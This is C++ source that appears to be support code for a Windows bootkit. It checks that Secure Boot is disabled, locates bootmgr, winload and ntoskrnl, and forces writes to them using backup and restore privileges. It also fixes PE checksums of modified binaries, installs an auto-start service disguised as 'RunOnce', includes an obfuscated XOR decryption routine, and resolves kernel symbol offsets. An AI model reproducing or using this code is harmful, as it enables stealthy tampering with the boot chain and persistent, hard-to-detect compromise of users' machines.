//sys mgr
__forceinline bool PrivilegeMgr(const char* Name, bool Enable) {
	HANDLE hToken; TOKEN_PRIVILEGES Priv; Priv.PrivilegeCount = 1;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
	Priv.Privileges[0].Attributes = Enable ? SE_PRIVILEGE_ENABLED : 0;
	auto ret = LookupPrivilegeValueA(nullptr, Name, &Priv.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, false, &Priv, sizeof(Priv), nullptr, nullptr);
	CloseHandle(hToken); return ret;
}

FIRMWARE_TYPE GetBootMode()
{
	auto BootType = FIRMWARE_TYPE::FirmwareTypeUnknown;
	if (!GetFirmwareType(&BootType) || (BootType == FirmwareTypeUnknown))
		return FIRMWARE_TYPE::FirmwareTypeUnknown;

	auto SecureBoot = false;
	if (BootType == FirmwareTypeUefi) {
		PrivilegeMgr("SeSystemEnvironmentPrivilege", true);
		GetFirmwareEnvironmentVariableA("SecureBoot", "{8be4df61-93ca-11d2-aa0d-00e098032b8c}", &SecureBoot, sizeof(bool));
		PrivilegeMgr("SeSystemEnvironmentPrivilege", false);
	}

	return SecureBoot ? FIRMWARE_TYPE::FirmwareTypeUnknown : BootType;
}

//get files paths
__forceinline void DeterminePathsSystemFiles(FIRMWARE_TYPE BootType, wchar_t* BootMgr, wchar_t* WinLoad, wchar_t* NTOSKrnl)
{
	//get base paths
	HKEY Control; char BootPath[64], SysPath[64]; DWORD PathSz1 = 64, PathSz2 = 64;
	RegOpenKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control", &Control);
	RegGetValueA(Control, 0, "SystemBootDevice", RRF_RT_REG_SZ, nullptr, SysPath, &PathSz2);
	RegGetValueA(Control, 0, "FirmwareBootDevice", RRF_RT_REG_SZ, nullptr, BootPath, &PathSz1);
	CloseHandle(Control);

	//add ArcName prefix
	StrCpy("\\\\.\\GLOBALROOT\\ArcName\\", BootMgr);
	StrCpy("\\\\.\\GLOBALROOT\\ArcName\\", WinLoad);
	StrCpy("\\\\.\\GLOBALROOT\\ArcName\\", NTOSKrnl);

	//add disk path
	StrCat(BootMgr, BootPath);
	StrCat(WinLoad, SysPath);
	StrCat(NTOSKrnl, SysPath);

	//add file path
	StrCat(NTOSKrnl, "\\Windows\\System32\\ntoskrnl.exe");
	StrCat(BootMgr, (BootType == FirmwareTypeBios) ? "\\bootmgr" : "\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
	StrCat(WinLoad, (BootType == FirmwareTypeBios) ? "\\Windows\\System32\\winload.exe" : "\\Windows\\System32\\winload.efi");
}

void GetSystemFilesBackupPaths(wchar_t* BootMgr, wchar_t* WinLoad, wchar_t* NTOSKrnl)
{
	//get exe path
	wchar_t ExePath[MAX_PATH];
	GetModuleFileNameW(nullptr, ExePath, MAX_PATH);
	
	//copy exe path
	StrCpy(ExePath, BootMgr);
	StrCpy(ExePath, WinLoad);
	StrCpy(ExePath, NTOSKrnl);

	//add file ext
	StrCat(BootMgr,  ".bmgr");
	StrCat(WinLoad,  ".wnld");
	StrCat(NTOSKrnl, ".ntos");
}

//file mgr
HANDLE CreateFileMagic(const wchar_t* FilePath, bool Write)
{
	//get priv
	PrivilegeMgr("SeBackupPrivilege", true);
	PrivilegeMgr("SeRestorePrivilege", true);

	//get set file attrib
	auto FileAttr = GetFileAttributesW(FilePath);
	SetFileAttributesW(FilePath, FILE_ATTRIBUTE_NORMAL);

	//force createfile
	auto dac = Write ? GENERIC_WRITE : GENERIC_READ; auto crtMode = Write ? OPEN_ALWAYS : OPEN_EXISTING;
	auto hFile = CreateFileW(FilePath, dac, 0, nullptr, crtMode, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS, nullptr);

	//restore old attrib
	if (FileAttr != INVALID_FILE_ATTRIBUTES) {
		SetFileAttributesW(FilePath, FileAttr);
	}

	//restore priv
	PrivilegeMgr("SeBackupPrivilege", false);
	PrivilegeMgr("SeRestorePrivilege", false);

	//ret magic handle
	return hFile;
}

bool FileExists(const wchar_t* FilePath) {
	auto hFile = CreateFileMagic(FilePath, false);
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		return true;
	} return false;
}

bool ReadFileToBuff(const wchar_t* FilePath, void* Buff, uint32_t* BuffSize = nullptr)
{
	//open file
	auto hFile = CreateFileMagic(FilePath, false);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;

	//get read size
	auto FileSize = GetFileSize(hFile, nullptr);
	if (BuffSize) *BuffSize = FileSize;

	//read file
	ReadFile(hFile, Buff, FileSize, nullptr, nullptr);
	CloseHandle(hFile);

	//ok!!!
	return true;
}

__forceinline bool WriteBuffToFile(const wchar_t* FilePath, void* Buff, uint32_t BuffSize)
{
	//create file
	auto hFile = CreateFileMagic(FilePath, true);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;

	//write file
	WriteFile(hFile, Buff, BuffSize, nullptr, nullptr);
	FlushFileBuffers(hFile);
	CloseHandle(hFile);

	//ok!!!
	return true;
}

//pe file
void FixPeChkSum(void* ModBase, uint32_t ModRawSize)
{
	//checksum main func
	auto ChkSum = [](uint32_t PartialSum, uint16_t* Source, uint32_t Length) {
		while (Length--) {
			PartialSum += *Source++;
			PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
		} return (uint16_t)(((PartialSum >> 16) + PartialSum) & 0xffff);
	};

	//get pe header
	auto NtHeaders = RtlImageNtHeader(ModBase);

	//calc new checksum
	auto PartialSum = ChkSum(0, (uint16_t*)ModBase, (ModRawSize + 1) >> 1);
	auto AdjustSum = (uint16_t*)(&NtHeaders->OptionalHeader.CheckSum);
	PartialSum -= (PartialSum < AdjustSum[0]);
	PartialSum -= AdjustSum[0];
	PartialSum -= (PartialSum < AdjustSum[1]);
	PartialSum -= AdjustSum[1];
	auto CheckSum = (uint32_t)PartialSum + ModRawSize;

	//update nt checksum
	NtHeaders->OptionalHeader.CheckSum = CheckSum;
}

__forceinline void* RVA_VA(void* RawMod, uint64_t RVA)
{
	//get nt header
	auto NT_Header = RtlImageNtHeader(RawMod);

	//get data ptr
	auto FirstSect = IMAGE_FIRST_SECTION(NT_Header);
	for (auto CurSect = FirstSect; CurSect < FirstSect + NT_Header->FileHeader.NumberOfSections; CurSect++) {
		if ((RVA >= CurSect->VirtualAddress) && (RVA < (CurSect->VirtualAddress + CurSect->Misc.VirtualSize))) {
			return (void*)((uintptr_t)RawMod + CurSect->PointerToRawData + (RVA - CurSect->VirtualAddress));
		}
	}

	//failed
	return nullptr;
}

//svc mgr
__forceinline void SvcInstall()
{
	wchar_t szPath[MAX_PATH];
	GetModuleFileNameW(nullptr, szPath, MAX_PATH);

	auto schSCManager = OpenSCManagerA(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	auto svcName = (L"RunOnce");
	auto schService = CreateServiceW(
		schSCManager,              // SCM database 
		svcName/*.crypt_get()*/,           // name of service 
		nullptr/*.crypt_get()*/,           // service name to display 
		SERVICE_ALL_ACCESS,        // desired access 
		SERVICE_WIN32_OWN_PROCESS, // service type 
		SERVICE_AUTO_START,        // start type 
		SERVICE_ERROR_NORMAL,      // error control type 
		szPath,                    // path to service's binary 
		NULL,                      // no load ordering group 
		NULL,                      // no tag identifier 
		NULL,                      // no dependencies 
		NULL,                      // LocalSystem account 
		NULL);                     // no password 

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}

__forceinline void DoDeleteSvc()
{
	auto schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	auto schService = OpenServiceW(
		schSCManager,       // SCM database 
	    (L"RunOnce"),    // name of service 
		DELETE);            // need delete access 

	DeleteService(schService);

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}

//crypt
DECLSPEC_NOINLINE //(VMProtect - Funcs - Mutation)
void DecrtBytes(PBYTE Buff, DWORD Size, PBYTE Out) {
	for (DWORD i = 0; i < Size; i++)
		Out[i] = (BYTE)(Buff[i] ^ ((i + 32 * i + 78) + 45 + i));
}

//pdb parse
uint8_t* GetSymAddress(const wchar_t* FilePath, const char* SymName, bool Cleanup = false)
{
	//build pdb path
	char symPath[MAX_PATH]; *(uint32_t*)&symPath[0] = 0x2A565253;
	GetWindowsDirectoryA((char*)&symPath[4], 64);
	StrCat(symPath, Cleanup ? ("\\Temp\\symTmp") : ("\\Temp\\symTmp*http://msdl.microsoft.com/download/symbols"));

	//clean folder
	if (Cleanup)
	{
		//double null meme (hehehe)
		symPath[StrLen(symPath) + 1] = 0;

		//build delete struct
		SHFILEOPSTRUCTA shfo = {
		   NULL,
		   FO_DELETE,
		   &symPath[4],
		   NULL,
		   FOF_NO_UI,
		   FALSE,
		   NULL,
		   NULL
		};

		//delete folder
		SHFileOperationA(&shfo);
		return nullptr;
	}

	//init pdb engine
	SymInitialize(NtCurrentProcess(), symPath, false);

	//set output mode
	SymSetOptions(SYMOPT_IGNORE_NT_SYMPATH | SYMOPT_ALLOW_ABSOLUTE_SYMBOLS);

	//load pdb file
	auto ModBase = SymLoadModuleExW(NtCurrentProcess(), nullptr, FilePath, nullptr, 0, 0, nullptr, 0);
	if (!ModBase) {
		SymCleanup(NtCurrentProcess());
		return nullptr;
	}

	//get pdb path
	IMAGEHLP_MODULEW64 ModuleInfo;
	ModuleInfo.SizeOfStruct = sizeof(IMAGEHLP_MODULEW64);
	SymGetModuleInfoW64(NtCurrentProcess(), ModBase, &ModuleInfo);

	//build symbol name
	char SymNameFix[64];
	StrCpy(ModuleInfo.ModuleName, SymNameFix);
	StrCat(SymNameFix, ("!"));
	StrCat(SymNameFix, SymName);

	//get func
	PBYTE ResolvedFunc = nullptr;
	PSYMBOL_INFO_PACKAGE SIP = (PSYMBOL_INFO_PACKAGE)_alloca(sizeof(SYMBOL_INFO_PACKAGE));
	SIP->si.MaxNameLen = sizeof(SIP->name);
	SIP->si.SizeOfStruct = sizeof(SYMBOL_INFO);
	if (SymFromName(NtCurrentProcess(), SymNameFix, &SIP->si)) {
		ResolvedFunc = (PBYTE)SIP->si.Address - ModBase;
	}

	//cleanup
	SymUnloadModule64(NtCurrentProcess(), ModBase);
	SymCleanup(NtCurrentProcess());

	//ret func offset
	return ResolvedFunc;
}